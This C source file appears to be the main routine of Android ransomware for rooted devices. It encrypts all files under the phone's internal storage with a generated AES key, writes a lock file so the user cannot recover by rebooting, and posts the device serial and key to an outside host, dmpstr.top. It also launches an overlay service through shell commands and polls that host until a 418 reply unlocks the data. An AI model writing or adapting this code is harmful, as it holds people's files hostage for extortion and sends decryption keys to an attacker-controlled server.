#include <complex.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

#include <cryptutils.h>
#include <device.h>
#include <walk.h>
#include <web.h>
#include <lock.h>

int main() {
    const char *key_path = "/data/adb/modules/.kys.keys";
    const char *lock_file = "/data/adb/modules/chas.lock";
    const char *url = "https://shoujo.dmpstr.top";
    const char *internal_storage = "/storage/emulated/0";
    const char *sn;
    unsigned char key[16]; // AES-128 key for symmetrical {en,de}cryption
    char json[256];

    // Grab SN to be sent to url
    sn = get_sn();
    // Disable ADB, should prevent key grabbing and potential intervention mid-execution
    //disable_adb();

    // Generate encryption key and put in key_path to be sent to url
    generate_key(key_path);

    // Load key to be used by walker
    if (load_key(key_path, key) != 0) {
        fprintf(stderr, "failed to load key.\n");
        return 1;
    }

    // Start crypting :troll:
    walk_and_encrypt(internal_storage, key) ;

    // Create lock file incase user tries to reboot w/o decrypting
    create_lock(lock_file);

    // Format to json to send to url
    snprintf(json, sizeof(json), "{\"identifier\": \"%s\", \"dkey\": \"%s\"}", sn, key);

    // Send to url
    post(url, json);

    // Start OverlayService
    system("pm grant top.dmpstr.overlay android.permission.SYSTEM_ALERT_WINDOW");
    system("am start-foreground-service --user 0 -a top.dmpstr.overlay/.ACTION_START -n top.dmpstr.top/.OverlayService");

    // Long-poll for decryption request
    char full_url[256];
    int len = strlen(sn);
    const char *suffix = sn + (len > 4 ? len - 4 : 0);

    while (1) {
        snprintf(full_url, sizeof(full_url), "%s/decrypt/%.4s", url, suffix);
        
        long stat_code = 0;
        int result = get(full_url, &stat_code);

        if ( result == 0 ) {
            printf("poll %s, %ld\n", full_url, stat_code);
            if (stat_code == 418) {
                printf("omedetou");
                    walk_and_decrypt(internal_storage, key);
                break;
            }
        }
        sleep(60);
    }
}
